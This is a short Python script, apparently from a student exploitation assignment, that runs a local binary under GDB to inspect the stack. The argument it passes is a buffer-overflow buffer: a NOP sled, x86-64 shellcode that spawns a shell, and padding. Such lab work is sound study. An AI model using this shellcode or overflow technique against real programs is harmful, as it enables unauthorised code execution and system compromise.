# Taylor Smith - Major Exploitation Task

import subprocess
import sys

# Buffer to pass to the program
buffer = '$(python2.7 -c \'print "\\x90"*450+"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"+"\\x41"*43+"b"*6\')'

def run_gdb_command(binary, commands):
    # Construct the GDB command
    gdb_cmd = ['gdb', '--batch', '--quiet', '--return-child-result']
    for cmd in commands:
        gdb_cmd.extend(['-ex', cmd])
    gdb_cmd.append(binary)
    
    # Run GDB and capture its output
    result = subprocess.run(gdb_cmd, capture_output=True, text=True)
    
    return result.stdout

def get_stack_data(binary_path, buffer):
    # Define the sequence of GDB commands
    commands = [
        f'set args {buffer}',  # Set program arguments
        'start',        # Start the program
        'x/200x $rsp',  # Examine stack, prepare to look for a return address
        'quit'          # Quit GDB
    ]
    
    # Run the GDB commands and return the raw output
    return run_gdb_command(binary_path, commands)

# TODO: Update to pass binary path as argument
if __name__ == "__main__":
    binary_path = sys.argv[1] if len(sys.argv) > 1 else "./pie"
    stack_data = get_stack_data(binary_path, buffer)
    print("Stack data:")
    print(stack_data)